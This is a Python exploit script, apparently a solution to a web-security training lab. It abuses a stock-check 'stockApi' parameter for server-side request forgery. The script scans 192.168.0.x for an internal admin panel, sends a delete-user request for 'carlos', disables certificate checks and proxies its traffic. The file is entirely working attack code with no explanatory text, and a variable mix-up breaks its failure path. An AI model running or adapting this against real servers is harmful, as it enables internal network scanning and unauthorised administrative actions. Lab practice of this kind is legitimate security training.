import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def check_admin_hostname(url):
    check_stock_path = '/product/stock'
    admin_hostname = ''
    for i in range(1, 256):
        hostname = 'http://192.168.0.%s:8080/admin' %i
        data = {
            "stockApi": hostname
        }
        r = requests.post(url + check_stock_path, data=data, verify=False, proxies=proxies)
        if r.status_code == 200:
            print("(+) Admin hostname found: %s" % hostname)
            admin_ip_address = '192.168.0.%s' %i
            break

    if admin_ip_address == '':
        print("(-) Admin hostname not found.")
        sys.exit(-1)
    return admin_ip_address
    
def delete_user(url, admin_ip_address):
    delete_user_url_ssrf_payload = "http://%s:8080/admin/delete?username=carlos" % admin_ip_address
    check_stock_path = '/product/stock'
    data = {
        "stockApi": delete_user_url_ssrf_payload
    }
    r = requests.post(url + check_stock_path, data=data, verify=False, proxies=proxies)

    # Check if user was deleted successfully

    admin_ssrf_payload = "http://%s:8080/admin" % admin_ip_address
    data2 = {
        "stockApi": admin_ssrf_payload
    }
    r = requests.post(url + check_stock_path, data=data2, verify=False, proxies=proxies)
    if "carlos" not in r.text:
        print("(+) User carlos deleted successfully!")
    else:
        print("(-) Failed to delete user carlos.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s https://example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) finding admin hostname...") 
    admin_ip_address = check_admin_hostname(url)
    print("(+) Admin IP address: %s" % admin_ip_address)
    print("(+) Deleting carlos user...")
    delete_user(url, admin_ip_address)

if __name__ == "__main__":
    main()